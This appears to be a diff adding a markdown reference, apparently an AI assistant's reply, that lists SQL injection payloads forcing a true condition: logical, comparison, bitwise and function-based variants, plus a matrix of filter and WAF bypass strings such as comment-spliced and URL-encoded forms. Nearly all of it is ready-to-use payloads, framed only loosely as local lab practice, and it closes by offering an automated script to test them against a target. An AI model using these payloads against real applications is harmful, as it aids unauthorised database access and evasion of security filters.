@@ -1,0 +1,80 @@
+When testing a local lab for SQL Injection, you are not limited to just AND 1=1. There are dozens of database operators and logical symbols that can be used to force a True condition. [1] 
+If a signature-based firewall or input filter blocks words like AND, OR, or the equals sign =, you can swap them out for mathematical functions, bitwise operations, or string comparators.
+Here is the complete reference of operators and expressions that evaluate to True in database environments, ready for local laboratory practice.
+------------------------------
+## 1. Standard Logical Operators
+These are the primary keywords built into every SQL engine (MySQL, PostgreSQL, MSSQL, Oracle).
+
+* AND / && — Evaluates to true if both sides are true.
+* ?id=1 AND 1=1
+   * ?id=1 && 1=1 (URL-encoded as %26%26) [2, 3] 
+* OR / || — Evaluates to true if at least one side is true. (Often paired with an intentional invalid index like id=-1 or id=0 to force the database to evaluate the right-hand side).
+* ?id=-1 OR 1=1
+   * ?id=-1 || 1=1 (URL-encoded as %7C%7C) [4, 5] 
+* XOR — Exclusive OR. Evaluates to true if only one side is true.
+* ?id=1 XOR 1=2 (True, because id=1 is true and 1=2 is false) [6, 7] 
+* NOT / ! — Reverses the logical state.
+* ?id=1 AND NOT 1=2 (True, because 1 is not equal to 2) [8, 9] 
+
+------------------------------
+## 2. Operators to Replace the Equals Sign (=)
+If a filter sanitizes or strips out the = character, you can use comparative operators or text searching functions instead. [10] 
+
+* LIKE — Simple string matching operator.
+* ?id=1 AND 1 LIKE 1
+* IN — Checks if a value exists within a specific array or set.
+* ?id=1 AND 1 IN (1,2,3) [11, 12] 
+* BETWEEN — Checks if an integer falls within a specific numeric range.
+* ?id=1 AND 5 BETWEEN 1 AND 10 [13, 14] 
+* GREATER THAN / LESS THAN (> or <) — Used to check mathematical inequality.
+* ?id=1 AND 2>1
+   * ?id=1 AND 1<2 [15, 16, 17, 18] 
+* NOT EQUAL TO (!= or <>) — Evaluates to true when values conflict.
+* ?id=1 AND 1!=2
+   * ?id=1 AND 1<>2 [19] 
+* REGEXP / RLIKE — Regular expression matching (highly effective in MySQL).
+* ?id=1 AND 1 REGEXP 1 [20, 21] 
+
+------------------------------
+## 3. Bitwise Operators
+Bitwise operations manipulate integers at the binary level. Filters almost never block these because they are rarely seen in standard web application queries. [22, 23, 24] 
+
+* & — Bitwise AND. Compares each bit of the first operand to the corresponding bit of the second.
+* ?id=1 AND 1&1 (True) [25] 
+* | — Bitwise OR.
+* ?id=1 AND 1|0 (True)
+* ^ — Bitwise XOR.
+* ?id=1 AND 1^0 (True) [26] 
+* << / >> — Bitwise left/right shift.
+* ?id=1 AND 1<<1 (Evaluates to 2, which counts as True because it is non-zero) [27, 28, 29] 
+
+------------------------------
+## 4. Mathematical Functions (The No-Number / No-Operator Bypasses)
+In advanced testing, you might find an environment that strips out numbers (1, 2) or comparison symbols entirely. You can use native SQL mathematical functions that evaluate directly to a logical True.
+
+* TRUE Keyword — Many modern databases recognize the literal word as a boolean statement.
+* ?id=1 AND TRUE [30] 
+* Non-Zero Integers — In databases like MySQL, any number that is not zero (0) is natively treated as True.
+* ?id=1 AND 5 (Evaluates to True)
+   * ?id=1 AND 0 (Evaluates to False) [31, 32] 
+* Self-Division Functions — Dividing a system function by itself always returns 1 (True).
+* ?id=1 AND PI()/PI()
+   * ?id=1 AND VERSION()/VERSION() (If the database version starts with an integer, like 8) [33] 
+* Hexadecimal Equivalents — Representing numbers or logic using hex codes to mask text string characters.
+* ?id=1 AND 0x1 (0x1 is hex for 1, which evaluates to True) [34] 
+
+------------------------------
+## 🔬 Summary Quick-Reference Matrix for Lab Testing
+
+| Core Vector Type | standard Payload Example | Advanced WAF-Bypass Alternative |
+|---|---|---|
+| Standard AND | ?id=1 AND 1=1 | ?id=1/**/AnD/**/1/**/LIKE/**/1 |
+| Symbolic AND | ?id=1 AND 1=1 | ?id=1%26%261%3D1 (Uses &&) |
+| Flipped OR | ?id=1 AND 1=1 | ?id=1-1 OR 5 BETWEEN 2 AND 8 |
+| No-Equals Sign | ?id=1 AND 1=1 | ?id=1 AND 1 IN (1) |
+| No-Numbers | ?id=1 AND 1=1 | ?id=1 AND TRUE |
+
+Would you like to learn how to check which of these operators your target database engine supports by reviewing error logs, or should we write a quick automated script to test them sequentially?
+
+
+    
